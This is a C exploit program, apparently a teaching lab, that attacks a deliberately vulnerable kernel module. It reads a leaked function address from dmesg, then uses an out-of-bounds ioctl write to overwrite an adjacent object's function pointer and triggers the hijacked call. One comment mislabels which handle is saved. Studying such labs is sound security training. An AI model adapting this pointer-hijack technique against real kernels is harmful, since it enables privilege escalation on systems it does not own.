#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

#define DEVICE_PATH "/dev/uv_oob_dev"

#define IOCTL_MAGIC		'Y'
#define IOCTL_ALLOC_VULOBJ		_IOWR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_FREE_VULOBJ		_IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_WRITE		        _IOW(IOCTL_MAGIC, 0x03, int)
#define IOCTL_READ		        _IOR(IOCTL_MAGIC, 0x04, int)
//#define IOCTL_SPRAY		        _IOWR(IOCTL_MAGIC, 0x05, int)
#define IOCTL_EXECUTE	        _IOW(IOCTL_MAGIC, 0x06, int)
#define IOCTL_ALLOC_VICTIM		_IOWR(IOCTL_MAGIC, 0x07, int)
#define IOCTL_FREE_VICTIM		_IOW(IOCTL_MAGIC, 0x08, int)

struct request_arg {
    int handler;
    int offset;
    char value;
};

// 从 dmesg 日志中获取模块初始化时打印的 bad_function 地址
unsigned long get_bad_addr() {
    FILE *fp = popen("dmesg | grep 'bad func'", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char *p = strstr(line, "bad func: 0x");
        if (p) {
            sscanf(p, "bad func: 0x%lx", &addr);
        }
    }
    pclose(fp);
    return addr;
}

int main() {
    int fd;
    int handler;
    struct request_arg req;

    printf("[*] Kernel OOB Exploit Simulation\n");

    // 0. 获取 bad_function 的内核地址
    unsigned long bad_func_addr = get_bad_addr();
    if (bad_func_addr == 0) {
        printf("[-] Failed to find bad_function address from dmesg.\n");
        printf("[-] Ensure the modulo is loaded and dmesg has the address.\n");
        return -1;
    }
    printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);

    // 1. 打开设备
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open the device");
        return -1;
    }
    printf("[+] Device opened successfully.\n");


    // 2. 通过 IOCTL_ALLOC_VULOBJ 分配一个 vulobj
    if (ioctl(fd, IOCTL_ALLOC_VULOBJ, &handler) < 0) {
        perror("[-] Failed to alloc a vulobj");
        close(fd);
        return -1;
    }
    printf("[+] Successfully alloc vulobj with handler: %d\n", handler);

    // 3. 通过 IOCTL_ALLOC_VICTIM 分配一个包含 good_function 函数指针的 victim_obj
    if (ioctl(fd, IOCTL_ALLOC_VICTIM, &handler) < 0) {
        perror("[-] Failed to alloc a victim_obj");
        close(fd);
        return -1;
    }
    printf("[+] Successfully alloc victim_obj with handler: %d\n", handler);
    int vulobj_idx = handler; // 保存分配vulobj后的handler值

    // 4. 触发 IOCTL_EXECUTE
    // 此时被调用的是 good_function
    printf("[+] Executing original funptr...\n");
    if (ioctl(fd, IOCTL_EXECUTE, &handler) < 0) {
        perror("[-] Failed to execute");
    }

    // 5. 利用 OOB WRITE 覆盖 vulobj (512 bytes) 之后的函数指针
    // struct uv_vulobj 的定义使得 uv_victim->funptr 紧跟在 buffer[512] 之后（堆风水得当）
    // 我们用 IOCTL_WRITE 逐字节将 bad_func_addr 写入 offset 512 到 519 的位置
    printf("[+] Overwriting funptr with bad_function address...\n");
    for (int i = 0; i < sizeof(unsigned long); i++) {
        // req.handler = handler;
        req.handler = vulobj_idx;
        req.offset = 512 + i;
        req.value = (char)((bad_func_addr >> (i * 8)) & 0xFF); // 提取地址的每一个字节写入
        
        if (ioctl(fd, IOCTL_WRITE, &req) < 0) {
            perror("[-] Failed to OOB write");
            close(fd);
            return -1; 
        }
    }
    printf("[+] Overwrite done.\n");

    // 6. 触发 IOCTL_EXECUTE
    // 此时被调用的其实已经是 bad_function 了
    printf("[+] Executing hijacked funptr...\n");
    if (ioctl(fd, IOCTL_EXECUTE, &handler) < 0) {
        perror("[-] Failed to execute");
    } else {
        printf("[+] Execute command sent. Run 'dmesg | tail' to check if 'bad' was printed!\n");
    }

    close(fd);
    return 0;

}